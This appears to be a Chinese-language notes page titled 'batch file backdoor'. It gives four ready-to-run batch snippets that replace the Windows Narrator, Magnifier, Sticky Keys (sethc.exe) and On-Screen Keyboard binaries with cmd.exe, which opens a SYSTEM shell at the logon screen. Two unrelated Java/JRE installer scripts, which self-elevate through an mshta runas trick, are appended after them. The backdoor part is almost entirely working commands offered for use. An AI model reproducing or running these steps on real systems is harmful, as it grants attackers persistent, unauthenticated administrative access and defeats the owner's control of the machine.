# 批处理文件后门



```bat
cd C:\windows\system32#切换目录
takeown /f narrator.exe#修改narrator的所有者
icacls narrator.exe /grant administrators:F#修改其权限为本机用户
ren narrator.exe  narrator_back.exe#重命名
copy cmd.exe narrator.exe#复制并命名
```

```bat
cd C:\windows\system32#放大镜修改为后门
takeown /f magnify.exe
icacls magnify.exe /grant administrators:F
ren magnify.exe magnify_back.exe
copy cmd.exe magnify.exe
```

```bat
cd C:\windows\system32#shift后门
takeown /f sethc.exe
icacls sethc.exe /grant administrators:F
ren sethc.exe seth1.exe
copy cmd.exe sethc.exe
```

```bat
cd C:\windows\system32#切换目录
takeown /f osk.exe#修改narrator的所有者
icacls osk.exe /grant administrators:F#修改其权限为本机用户
ren osk.exe  osk_back.exe#重命名
copy cmd.exe osk.exe#复制并命名


```
#一配置jAVA环境变量
```
@echo off
 
 
%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit
 
set myjdkpath=C:\Java\jdk1.8
 
echo **********************************************
echo.
echo     将要安装jdk
echo.
echo  安装请按任意键，退出直接关闭窗口
echo.
echo **********************************************
 
pause
 
echo.
echo 正在安装jdk，请不要执行其他操作
echo.
echo 请稍等，这个时间大约需要三、四分钟
echo.
start /WAIT jdk-8u141-windows-i586.exe /qn INSTALLDIR=C:\Java\jdk1.8
echo jdk安装完毕
 
set JAVA_HOME=C:\Java\jdk1.8
set PATH=%PATH%;%%JAVA_HOME%%\bin;%%JAVA_HOME%%\jre\bin
set CLASSPATH=.;%%JAVA_HOME%%\lib\dt.jar;%%JAVA_HOME%%\lib\tools.jar
 
set RegV=HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
 
reg add "%RegV%" /v "JAVA_HOME" /d "%JAVA_HOME%" /f
reg add "%RegV%" /v "Path" /t REG_EXPAND_SZ /d "%PATH%" /f
reg add "%RegV%" /v "CLASSPATH" /d "%CLASSPATH%" /f
mshta vbscript:msgbox("Java环境已成功注册！",64,"成功")(window.close)
 
#-Dfile.encoding=utf-8
 
exit
```

——————————————————————————————————
#一键配置JRE环境变量

```
@echo off
 
 
%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit
 
set myjrepath=C:\Java\jre
 
echo **********************************************
echo.
echo   将要安装软件运行环境jre
echo.
echo  安装请按任意键，退出直接关闭窗口
echo.
echo **********************************************
 
pause
 
echo.
echo 正在安装jre，请不要执行其他操作
echo.
echo 请稍等，这个时间大约需要四、五分钟
echo.
start /WAIT jre-8u144-windows-i586.exe /s INSTALLDIR=C:\Java\jre
echo jre安装完毕
 
set JAVA_HOME=C:\Java
set PATH=%PATH%;%%JAVA_HOME%%\jre\bin
set CLASSPATH=.;%%JAVA_HOME%%\jre\lib
 
set RegV=HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
 
reg add "%RegV%" /v "JAVA_HOME" /d "%JAVA_HOME%" /f
reg add "%RegV%" /v "Path" /t REG_EXPAND_SZ /d "%PATH%" /f
reg add "%RegV%" /v "CLASSPATH" /d "%CLASSPATH%" /f
mshta vbscript:msgbox("Java环境已成功注册！",64,"成功")(window.close)
 
exit
```
